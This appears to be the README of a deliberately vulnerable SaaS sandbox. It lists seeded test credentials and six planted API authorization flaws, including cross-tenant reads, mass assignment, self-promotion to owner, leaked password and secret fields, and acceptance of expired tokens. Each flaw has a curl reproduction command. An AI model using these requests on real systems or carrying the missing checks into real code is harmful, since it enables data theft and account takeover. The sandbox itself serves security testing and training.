# Planted vulnerabilities (intentional — sandbox resembling a real client app)

This app is a deliberately-vulnerable sandbox built to resemble the shape of a
real client engagement: a multi-tenant SaaS app with a 6-role RBAC model,
where role/tenant checks are systemically missing across most endpoints. Do
not "fix" these without instruction — that defeats the purpose of this repo.

## Accounts (seeded in `data.js`)

| Email | Password | Org | Role |
|---|---|---|---|
| owner@account1.test | owner123 | org_1 (Account 1) | owner |
| operator@account1.test | operator123 | org_1 (Account 1) | operator |
| developer@account1.test | developer123 | org_1 (Account 1) | developer |
| viewer@account1.test | viewer123 | org_1 (Account 1) | viewer |
| enduser@account1.test | enduser123 | org_1 (Account 1) | end_user |
| customer@account1.test | customer123 | org_1 (Account 1) | customer |
| owner@account2.test | owner123 | org_2 (Account 2) | owner |

Auth: real signed JWT (HS256, `jsonwebtoken`). `POST /api/v1/auth/login`
with `{email, password}` returns `{token}`. Use it as
`Authorization: Bearer <token>` on every other route below.

Base URL below is `http://localhost:3000`; swap for
`https://auto-fix-mcp.onrender.com` to test the deployed instance.

---

## 1. API5:2023 Broken Function Level Authorization (BFLA) — systemic, all routes

**Where:** every `requireAuth`-protected route in [index.js](index.js). The
middleware only verifies the token is validly signed — it never checks
`req.user.role` against the route's intended access.

**Intended vs actual access:**

| Route | Intended roles | Actual |
|---|---|---|
| `GET /api/v1/orgs/:orgId` | owner | any role |
| `PUT /api/v1/orgs/:orgId` | owner | any role |
| `GET /api/v1/orgs/:orgId/audit-log` | owner, operator | any role |
| `GET /api/v1/orgs/:orgId/api-keys` | owner, operator | any role |
| `GET /api/v1/orgs/:orgId/users` | owner, operator | any role |
| `PUT /api/v1/orgs/:orgId/users/:userId/role` | owner | any role |
| `GET /api/v1/orgs/:orgId/connectors` | owner, operator, developer | any role |
| `GET /api/v1/orgs/:orgId/workflows` | owner, operator, developer | any role |
| `POST /api/v1/orgs/:orgId/workflows/:workflowId/deploy` | owner, operator, developer | any role |
| `GET /api/v1/orgs/:orgId/usage` | owner | any role |
| `GET /api/v1/orgs/:orgId/hub-settings` | owner, operator | any role |

**Reproduce — lowest-privilege role (`customer`) reads owner-only audit log:**
```sh
curl -s -X POST http://localhost:3000/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"customer@account1.test","password":"customer123"}'
# => {"token":"<JWT>"}

curl -s http://localhost:3000/api/v1/orgs/org_1/audit-log -H 'Authorization: Bearer <JWT>'
# => 200 OK, full audit trail, even though customer should never see it
```

---

## 2. API1:2023 Broken Object Level Authorization (BOLA) — cross-tenant

**Where:** same routes as above — none check `req.user.orgId` against the
`:orgId` in the path, so any account from either tenant can read/write the
other tenant's data.

**Pure BOLA demo (no role mismatch involved):** `GET /api/v1/orgs/:orgId/usage`
— Account 2's `owner` reads Account 1's `owner`-only usage stats. Same role,
wrong tenant.

```sh
curl -s -X POST http://localhost:3000/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"owner@account2.test","password":"owner123"}'
# => {"token":"<ACCOUNT2_OWNER_JWT>"}

curl -s http://localhost:3000/api/v1/orgs/org_1/usage -H 'Authorization: Bearer <ACCOUNT2_OWNER_JWT>'
# => 200 OK, returns Account 1's usage/billing data
```

---

## 3. API3:2023 Mass Assignment

**Where:** `PUT /api/v1/orgs/:orgId` in [index.js](index.js) —
`Object.assign(org, req.body)` applies the entire request body with no
field allow-list.

```sh
curl -s -X PUT http://localhost:3000/api/v1/orgs/org_1 \
  -H 'Authorization: Bearer <ANY_VALID_JWT>' -H 'Content-Type: application/json' \
  -d '{"plan":"enterprise","billingEmail":"attacker@evil.test"}'
# => plan and billingEmail overwritten by a non-owner caller
```

---

## 4. Privilege Escalation

**Where:** `PUT /api/v1/orgs/:orgId/users/:userId/role` in [index.js](index.js)
— sets `member.role` directly from the request body with no check on the
caller's own role.

```sh
# Logged in as the lowest-privilege account (customer):
curl -s -X PUT http://localhost:3000/api/v1/orgs/org_1/users/u6/role \
  -H 'Authorization: Bearer <CUSTOMER_JWT>' -H 'Content-Type: application/json' \
  -d '{"role":"owner"}'
# => customer promotes themself to owner
```

---

## 5. API3:2023 Excessive Data Exposure

**Where:** `GET /api/v1/orgs/:orgId/users` and `GET /api/v1/orgs/:orgId/api-keys`
in [index.js](index.js) — return raw stored objects instead of a filtered DTO.

```sh
curl -s http://localhost:3000/api/v1/orgs/org_1/users -H 'Authorization: Bearer <ANY_VALID_JWT>'
# => includes each user's plaintext "password" field

curl -s http://localhost:3000/api/v1/orgs/org_1/api-keys -H 'Authorization: Bearer <ANY_VALID_JWT>'
# => includes raw "secret" values for every API key
```

---

## 6. Expired Authorization

**Where:** `requireAuth` in [index.js](index.js) — calls
`jwt.verify(token, JWT_SECRET, { ignoreExpiration: true })`. The signature is
genuinely checked (tokens can't be forged without valid credentials), but an
expired token is still accepted indefinitely.

**Reproduce:** log in, wait past the 1-hour `exp` (or decode/re-sign a token
with a past `exp` using the same secret if testing locally), then call any
route with that token — it still succeeds instead of returning 401.
